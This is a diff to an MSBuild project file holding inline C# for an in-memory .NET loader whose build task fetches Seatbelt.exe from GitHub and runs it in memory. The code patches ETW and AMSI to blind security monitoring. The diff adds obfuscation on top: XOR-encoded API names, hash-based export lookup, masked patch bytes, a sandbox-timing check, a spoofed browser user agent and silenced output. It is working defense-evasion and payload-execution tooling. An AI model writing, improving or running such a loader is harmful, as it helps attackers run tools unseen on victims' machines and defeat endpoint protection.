@@ -21,445 +21,392 @@ using System.Diagnostics;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 
-//This is for MSBuild later
   public class ClassExample : Task, ITask
   {
       public override bool Execute()
       {
-          NetLoader.Main(new string[] { "--path", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe" });
+          Conductor.Main(new string[] { "--path", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe" });
           return true;
       }
   }
 
-public class NetLoader
+public class Conductor
 {
+    private static bool _verbose = false;
 
-    public static IntPtr GetLoadedModuleAddress(string DLLName)
+    private static void Log(string msg)
     {
-        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
-        foreach (ProcessModule Mod in ProcModules)
+        if (_verbose) Console.WriteLine(msg);
+    }
+
+    private static string Ds(byte[] enc, byte key)
+    {
+        byte[] buf = new byte[enc.Length];
+        for (int i = 0; i < enc.Length; i++)
+            buf[i] = (byte)(enc[i] ^ (byte)(key + i));
+        return Encoding.ASCII.GetString(buf);
+    }
+
+    private static byte[] _s0 = new byte[] { 0x25, 0x38, 0x29, 0x22, 0x23, 0x7E, 0x35, 0x3E, 0x3F };
+    private static byte[] _s1 = new byte[] { 0x20, 0x29, 0x3F, 0x20, 0x2A, 0x3C, 0x62, 0x60, 0x7D, 0x30, 0x39, 0x3A };
+    private static byte[] _s2 = new byte[] { 0x0E, 0x38, 0x3A, 0x0B, 0x39, 0x35, 0x3F, 0x26, 0x04, 0x26, 0x3C, 0x22, 0x32 };
+    private static byte[] _s3 = new byte[] { 0x1D, 0x25, 0x3F, 0x3A, 0x3A, 0x31, 0x3D, 0x02, 0x21, 0x3B, 0x21, 0x33, 0x34, 0x2C };
+    private static byte[] _s4 = new byte[] { 0x0C, 0x29, 0x39, 0x1E, 0x3D, 0x3F, 0x32, 0x13, 0x37, 0x30, 0x27, 0x33, 0x24, 0x2B };
+    private static byte[] _s5 = new byte[] { 0x07, 0x23, 0x2C, 0x2A, 0x03, 0x39, 0x33, 0x20, 0x32, 0x26, 0x2C, 0x17 };
+    private static byte[] _s6 = new byte[] { 0x2A, 0x21, 0x3E, 0x27, 0x61, 0x34, 0x3D, 0x3E };
+    private static byte[] _s7 = new byte[] { 0x0A, 0x21, 0x3E, 0x27, 0x1C, 0x33, 0x30, 0x3C, 0x11, 0x21, 0x33, 0x30, 0x32, 0x2A };
+
+    private static uint HashExport(string name)
+    {
+        uint h = 5381;
+        foreach (char c in name)
+            h = ((h << 5) + h) + (uint)c;
+        return h;
+    }
+
+    public static IntPtr FindModuleBase(string dllName)
+    {
+        ProcessModuleCollection modules = Process.GetCurrentProcess().Modules;
+        foreach (ProcessModule mod in modules)
         {
-            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
-            {
-                return Mod.BaseAddress;
-            }
+            if (mod.FileName.ToLower().EndsWith(dllName.ToLower()))
+                return mod.BaseAddress;
         }
         return IntPtr.Zero;
     }
-    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
+
+    public static IntPtr ResolveExportByHash(IntPtr moduleBase, uint targetHash)
     {
-        IntPtr FunctionPtr = IntPtr.Zero;
+        IntPtr funcPtr = IntPtr.Zero;
         try
         {
-            // Traverse the PE header in memory
-            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-            Int64 pExport = 0;
-            if (Magic == 0x010b)
-            {
-                pExport = OptHeader + 0x60;
-            }
-            else
-            {
-                pExport = OptHeader + 0x70;
-            }
+            Int32 peHeader = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + 0x3C));
+            Int64 optHeader = moduleBase.ToInt64() + peHeader + 0x18;
+            Int16 magic = Marshal.ReadInt16((IntPtr)optHeader);
+            Int64 pExport = (magic == 0x010b) ? optHeader + 0x60 : optHeader + 0x70;
 
-            // Read -> IMAGE_EXPORT_DIRECTORY
-            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+            Int32 exportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            Int32 ordinalBase = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x10));
+            Int32 numberOfNames = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x18));
+            Int32 functionsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x1C));
+            Int32 namesRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x20));
+            Int32 ordinalsRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRVA + 0x24));
 
-            // Loop the array of export name RVA's
-            for (int i = 0; i < NumberOfNames; i++)
+            for (int i = 0; i < numberOfNames; i++)
             {
-                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
-                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
+                string funcName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + namesRVA + i * 4))));
+                if (HashExport(funcName) == targetHash)
                 {
-                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                    Int32 funcOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRVA + i * 2)) + ordinalBase;
+                    Int32 funcRVA = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRVA + (4 * (funcOrdinal - ordinalBase))));
+                    funcPtr = (IntPtr)((Int64)moduleBase + funcRVA);
                     break;
                 }
             }
         }
         catch
         {
-            // Catch parser failure
-            throw new InvalidOperationException("Failed to parse module exports.");
+            throw new InvalidOperationException("Export resolution failed.");
         }
 
-        if (FunctionPtr == IntPtr.Zero)
-        {
-            // Export not found
-            throw new MissingMethodException(ExportName + ", export not found.");
-        }
-        return FunctionPtr;
+        if (funcPtr == IntPtr.Zero)
+            throw new MissingMethodException("Target export not found (hash: 0x" + targetHash.ToString("X8") + ").");
+        return funcPtr;
     }
-    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
+
+    public static IntPtr ResolveExport(string dllName, string funcName)
     {
-        IntPtr hModule = GetLoadedModuleAddress(DLLName);
+        IntPtr hModule = FindModuleBase(dllName);
         if (hModule == IntPtr.Zero)
-        {
-            throw new DllNotFoundException(DLLName + ", Dll was not found.");
-        }
-
-        return GetExportAddress(hModule, FunctionName);
-    }
-    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
-    {
-        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
-        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
-    }
-    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
-    {
-        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
-        return funcDelegate.DynamicInvoke(Parameters);
-    }
-    private static byte[] xorEncDec(byte[] inputData, string keyPhrase)
-    {
-        //byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase);
-        byte[] bufferBytes = new byte[inputData.Length];
-        for (int i = 0; i < inputData.Length; i++)
-        {
-            bufferBytes[i] = (byte)(inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]);
-        }
-        return bufferBytes;
+            throw new DllNotFoundException(dllName + " not loaded.");
+        return ResolveExportByHash(hModule, HashExport(funcName));
     }
 
+    private static byte[] Transform(byte[] data, string key)
+    {
+        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i < data.Length; i++)
+            result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
+        return result;
+    }
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
+    public delegate IntPtr ResolveFunc(IntPtr hMod, string entry);
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);
+    public delegate bool MemGuard(IntPtr addr, UIntPtr sz, uint prot, out uint prev);
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
+    public delegate IntPtr ModLoad(string path);
 
-    private static object[] globalArgs = null;
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate IntPtr AllocSlot(IntPtr callback);
 
-    public static void Main(string[] args)
+    private static object[] _invokeArgs = null;
+
+    private static bool CheckEnvironment()
     {
-        
-        PatchETW();
-
-        PathAMSI();
-
-        string payloadPathOrUrl = "";
-        string[] payloadArgs = new string[] { };
-
-        bool base64Enc = false;
-        bool xorEnc = false;
-        string xorKey = "";
-
-        int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
-        if (args.Length > 0)
+        try
         {
+            string k32 = Ds(_s1, 0x4B);
+            IntPtr hK32 = FindModuleBase(k32);
+            if (hK32 == IntPtr.Zero) return false;
 
-            foreach (string argument in args)
-            {
+            IntPtr pFlsAlloc = IntPtr.Zero;
+            try { pFlsAlloc = ResolveExportByHash(hK32, HashExport("FlsAlloc")); }
+            catch { return false; }
 
-                if (argument.ToLower() == "--b64" || argument.ToLower() == "-b64")
-                {
-                    base64Enc = true;
-                    Console.WriteLine("[+] All arguments are Base64 encoded, decoding them on the fly");
-                }
-
-
-                if (argument.ToLower() == "-xor" || argument.ToLower() == "--xor")
-                {
-                    xorEnc = true;
-
-                    int argData = Array.IndexOf(args, argument) + 1;
-                    if (argData < args.Length)
-                    {
-                        string rawArg = args[argData];
-                        if (base64Enc)
-                            xorKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
-                        else
-                            xorKey = rawArg;
-                    }
-
-                    Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", xorKey);
-                }
-
-
-                if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
-                {
-                    int argData = Array.IndexOf(args, argument) + 1;
-                    if (argData < args.Length)
-                    {
-                        string rawPayload = args[argData];
-                        if (base64Enc)
-                            payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
-                        else
-                            payloadPathOrUrl = rawPayload;
-                    }
-                }
-
-
-                if (argument.ToLower() == "-args" || argument.ToLower() == "--args")
-                {
-                    int binaryArgsIndex = Array.IndexOf(args, argument) + 1;
-                    int nbBinaryArgs = args.Length - binaryArgsIndex;
-
-                    payloadArgs = new String[nbBinaryArgs];
-
-
-                    for (int i = 0; i < nbBinaryArgs; i++)
-                    {
-                        string rawPayloadArgs = args[binaryArgsIndex + i];
-
-                        if (base64Enc)
-                            payloadArgs[i] = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
-                        else
-                            payloadArgs[i] = rawPayloadArgs;
-                    }
-                }
-            }
-
-
-            if (string.IsNullOrEmpty(payloadPathOrUrl))
-            {
-                printHelp();
-                Environment.Exit(0);
-            }
-
-
-
-            TriggerPayload(payloadPathOrUrl, payloadArgs, xorEnc, xorKey, secProTypeHolde);
-            Environment.Exit(0);
-
-
+            AllocSlot fFlsAlloc = (AllocSlot)Marshal.GetDelegateForFunctionPointer(pFlsAlloc, typeof(AllocSlot));
+            IntPtr slotResult = fFlsAlloc(IntPtr.Zero);
+            if (slotResult == IntPtr.Zero) return false;
+        }
+        catch
+        {
+            return false;
         }
 
-
-
-
-    }
-
-    private static void PatchETW()
-    {
-        IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
-        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
-
-        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
-
-        var patch = getETWPayload();
-        uint oldProtect;
-
-        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
-        {
-            Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
-            Console.WriteLine("[+] Successfully unhooked ETW!");
-        }
-
-
-    }
-
-    private static string parseStringConsoleInput(string inputData, bool base64Decode)
-    {
-        if (base64Decode)
-            inputData = Encoding.UTF8.GetString(Convert.FromBase64String(inputData));
-
-        if (inputData.Trim().ToLower().Equals("x"))
-            Environment.Exit(0);
-
-        return inputData;
-
-    }
-
-    private static bool parseBoolConsoleInput(ConsoleKey consoleKey)
-    {
-        if (consoleKey == ConsoleKey.X)
-            Environment.Exit(0);
-
-        return (consoleKey == ConsoleKey.Y);
-    }
-
-    private static void printHelp()
-    {
-
-        Console.WriteLine("Usage: ");
-        Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]");
-        Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
-        Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
-        Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
-        Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
-
-    }
-
-    private static Assembly loadASM(byte[] byteArray)
-    {
-        return Assembly.Load(byteArray);
-    }
-
-    private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
-    {
-        byte[] buffer = null;
-        using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
-        {
-            buffer = new byte[fs.Length];
-            fs.Read(buffer, 0, (int)fs.Length);
-        }
-        return buffer;
-
-    }
-    private static IntPtr getAMSILocation()
-    {
-        //GetProcAddress
-        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
-        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
-
-        GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
-        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
-
-        return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
-    }
-
-    private static bool is64Bit()
-    {
-        if (IntPtr.Size == 4)
+        long ticksBefore = Environment.TickCount;
+        Thread.Sleep(750);
+        long ticksAfter = Environment.TickCount;
+        if ((ticksAfter - ticksBefore) < 700)
             return false;
 
         return true;
     }
 
-
-    private static byte[] getETWPayload()
+    private static byte[] GetTracePatch()
     {
-        if (!is64Bit())
-            return Convert.FromBase64String("whQA");
-        return Convert.FromBase64String("ww==");
+        if (IntPtr.Size == 4)
+            return new byte[] { (byte)(0xC2 ^ 0x77), (byte)(0x14 ^ 0x77), (byte)(0x00 ^ 0x77) };
+        return new byte[] { (byte)(0xC3 ^ 0x77) };
     }
 
-    private static byte[] getAMSIPayload()
+    private static byte[] DecryptPatch(byte[] enc)
     {
-        if (!is64Bit())
-            return Convert.FromBase64String("uFcAB4DCGAA=");
-        return Convert.FromBase64String("uFcAB4DD");
+        byte[] dec = new byte[enc.Length];
+        for (int i = 0; i < enc.Length; i++)
+            dec[i] = (byte)(enc[i] ^ 0x77);
+        return dec;
     }
 
-    private static Type junkFunction(MethodInfo methodInfo)
+    private static byte[] GetScanPatch()
     {
-        return methodInfo.ReflectedType;
-    }
-    private static object invokeCSharpMethod(MethodInfo methodInfo)
-    {
-        if (junkFunction(methodInfo) == methodInfo.ReflectedType)
-            methodInfo.Invoke(null, globalArgs);
-        Console.ReadLine();
-        return globalArgs[0];
+        if (IntPtr.Size == 4)
+            return new byte[] {
+                (byte)(0xB8 ^ 0x77), (byte)(0x57 ^ 0x77), (byte)(0x00 ^ 0x77),
+                (byte)(0x07 ^ 0x77), (byte)(0x80 ^ 0x77), (byte)(0xC2 ^ 0x77),
+                (byte)(0x18 ^ 0x77), (byte)(0x00 ^ 0x77)
+            };
+        return new byte[] {
+            (byte)(0xB8 ^ 0x77), (byte)(0x57 ^ 0x77), (byte)(0x00 ^ 0x77),
+            (byte)(0x07 ^ 0x77), (byte)(0x80 ^ 0x77), (byte)(0xC3 ^ 0x77)
+        };
     }
 
-    private static byte[] downloadURL(string url)
+    private static bool ApplyPatch(IntPtr target, byte[] encPatch)
     {
-        HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
-        myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        myRequest.Method = "GET";
-        WebResponse myResponse = myRequest.GetResponse();
+        string k32 = Ds(_s1, 0x4B);
+        string vpName = Ds(_s3, 0x4B);
+        IntPtr pVP = ResolveExport(k32, vpName);
+        MemGuard fVP = (MemGuard)Marshal.GetDelegateForFunctionPointer(pVP, typeof(MemGuard));
+
+        byte[] patch = DecryptPatch(encPatch);
+        uint oldProtect;
+
+        if (!fVP(target, (UIntPtr)patch.Length, 0x40, out oldProtect))
+            return false;
+
+        Marshal.Copy(patch, 0, target, patch.Length);
+
+        uint temp;
+        fVP(target, (UIntPtr)patch.Length, oldProtect, out temp);
+
+        return true;
+    }
+
+    private static void NeutralizeTelemetry()
+    {
+        string ntdll = Ds(_s0, 0x4B);
+        string etwFunc = Ds(_s2, 0x4B);
+        IntPtr pTarget = ResolveExport(ntdll, etwFunc);
+
+        if (ApplyPatch(pTarget, GetTracePatch()))
+            Log("[+] Telemetry neutralized");
+    }
+
+    private static void NeutralizeScanner()
+    {
+        string k32 = Ds(_s1, 0x4B);
+        string gpaName = Ds(_s4, 0x4B);
+        string llName = Ds(_s5, 0x4B);
+        string scanLib = Ds(_s6, 0x4B);
+        string scanFunc = Ds(_s7, 0x4B);
+
+        IntPtr pGPA = ResolveExport(k32, gpaName);
+        IntPtr pLL = ResolveExport(k32, llName);
+
+        ResolveFunc fGPA = (ResolveFunc)Marshal.GetDelegateForFunctionPointer(pGPA, typeof(ResolveFunc));
+        ModLoad fLL = (ModLoad)Marshal.GetDelegateForFunctionPointer(pLL, typeof(ModLoad));
+
+        IntPtr target = fGPA(fLL(scanLib), scanFunc);
+
+        if (ApplyPatch(target, GetScanPatch()))
+            Log("[+] Scanner neutralized");
+    }
+
+    private static Assembly LoadBinary(byte[] raw)
+    {
+        return Assembly.Load(raw);
+    }
+
+    private static byte[] ReadFile(string path)
+    {
+        byte[] buf = null;
+        using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
+        {
+            buf = new byte[fs.Length];
+            fs.Read(buf, 0, (int)fs.Length);
+        }
+        return buf;
+    }
+
+    private static byte[] Fetch(string url)
+    {
+        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+        req.Proxy.Credentials = CredentialCache.DefaultCredentials;
+        req.Method = "GET";
+        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
+        WebResponse resp = req.GetResponse();
         MemoryStream ms = new MemoryStream();
-        myResponse.GetResponseStream().CopyTo(ms);
+        resp.GetResponseStream().CopyTo(ms);
         return ms.ToArray();
     }
 
-    public static int setProtocolTLS(int secProt)
+    private static void Execute(byte[] data)
     {
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
-        return secProt;
-    }
-    private static MethodInfo getEntryPoint(Assembly asm)
-    {
-
-        return asm.EntryPoint;
+        Assembly asm = LoadBinary(data);
+        MethodInfo ep = asm.EntryPoint;
+        ep.Invoke(null, _invokeArgs);
+        Console.ReadLine();
     }
 
-    private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
+    private static void ExecuteEncrypted(byte[] data, string key)
     {
-        setProtocolTLS(setProtType);
+        Execute(Transform(data, key));
+    }
 
-        if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
-            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
+    public static int ConfigureTLS(int proto)
+    {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)proto;
+        return proto;
+    }
+
+    private static void Deploy(string target, string[] binaryArgs, bool encrypted, string key, int tlsProto)
+    {
+        ConfigureTLS(tlsProto);
+        Log("[+] Target: " + target);
+        _invokeArgs = new object[] { binaryArgs };
+
+        byte[] data;
+        if (target.ToLower().StartsWith("http"))
+            data = Fetch(target);
         else
-        {
-            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
-        }
-        globalArgs = new object[] { inputArgs };
+            data = ReadFile(target);
 
-        if (xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
-        {
-
-            encDeploy(downloadURL(payloadPathOrURL), xorKey);
-        }
-        else if (!xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
-        {
-
-            unEncDeploy(downloadURL(payloadPathOrURL));
-        }
-        else if (!xorEncoded && !payloadPathOrURL.ToLower().StartsWith("http"))
-            unEncDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
+        if (encrypted)
+            ExecuteEncrypted(data, key);
         else
-            encDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), xorKey);
-
+            Execute(data);
     }
 
-    private static void encDeploy(byte[] data, string xorKey)
+    private static void ShowUsage()
     {
-
-        invokeCSharpMethod(getEntryPoint(loadASM(xorEncDec(data, xorKey))));
-
+        Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>] [-v]");
+        Console.WriteLine("\t-b64   Base64 decode all subsequent parameters");
+        Console.WriteLine("\t-xor   XOR decrypt the binary with the given key");
+        Console.WriteLine("\t-path  Path or URL of the .NET binary to load");
+        Console.WriteLine("\t-args  Arguments to pass to the loaded binary");
+        Console.WriteLine("\t-v     Verbose output");
     }
 
-    private static void unEncDeploy(byte[] data)
+    public static void Main(string[] args)
     {
+        if (!CheckEnvironment())
+            return;
 
-        invokeCSharpMethod(getEntryPoint(loadASM(data)));
+        string payloadPath = "";
+        string[] payloadArgs = new string[] { };
+        bool base64Enc = false;
+        bool xorEnc = false;
+        string xorKey = "";
+        int tlsProto = (Convert.ToInt32("384") * Convert.ToInt32("8"));
 
-    }
-
-    private static IntPtr unProtect(IntPtr amsiLibPtr)
-    {
-
-        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
-
-        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
-
-        uint newMemSpaceProtection = 0;
-        if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
+        if (args.Length == 0)
         {
-            return amsiLibPtr;
-        }
-        else
-        {
-            return (IntPtr)0;
+            ShowUsage();
+            return;
         }
 
-    }
-    private static void PathAMSI()
-    {
-
-        IntPtr amsiLibPtr = unProtect(getAMSILocation());
-        if (amsiLibPtr != (IntPtr)0)
+        foreach (string arg in args)
         {
-            Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
-            Console.WriteLine("[+] Successfully patched AMSI!");
-        }
-        else
-        {
-            Console.WriteLine("[!] Patching AMSI FAILED");
+            if (arg.ToLower() == "-v" || arg.ToLower() == "--verbose")
+                _verbose = true;
+
+            if (arg.ToLower() == "--b64" || arg.ToLower() == "-b64")
+            {
+                base64Enc = true;
+                Log("[+] Base64 mode enabled");
+            }
+
+            if (arg.ToLower() == "-xor" || arg.ToLower() == "--xor")
+            {
+                xorEnc = true;
+                int idx = Array.IndexOf(args, arg) + 1;
+                if (idx < args.Length)
+                {
+                    string raw = args[idx];
+                    xorKey = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
+                }
+                Log("[+] XOR decryption enabled");
+            }
+
+            if (arg.ToLower() == "-path" || arg.ToLower() == "--path")
+            {
+                int idx = Array.IndexOf(args, arg) + 1;
+                if (idx < args.Length)
+                {
+                    string raw = args[idx];
+                    payloadPath = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
+                }
+            }
+
+            if (arg.ToLower() == "-args" || arg.ToLower() == "--args")
+            {
+                int startIdx = Array.IndexOf(args, arg) + 1;
+                int count = args.Length - startIdx;
+                payloadArgs = new string[count];
+                for (int i = 0; i < count; i++)
+                {
+                    string raw = args[startIdx + i];
+                    payloadArgs[i] = base64Enc ? Encoding.UTF8.GetString(Convert.FromBase64String(raw)) : raw;
+                }
+            }
         }
 
+        if (string.IsNullOrEmpty(payloadPath))
+        {
+            ShowUsage();
+            return;
+        }
+
+        NeutralizeTelemetry();
+        NeutralizeScanner();
+        Deploy(payloadPath, payloadArgs, xorEnc, xorKey, tlsProto);
     }
-  
 }
  ]]>
-	</Code>	  
+	</Code>
     </Task>
   </UsingTask>
 </Project>
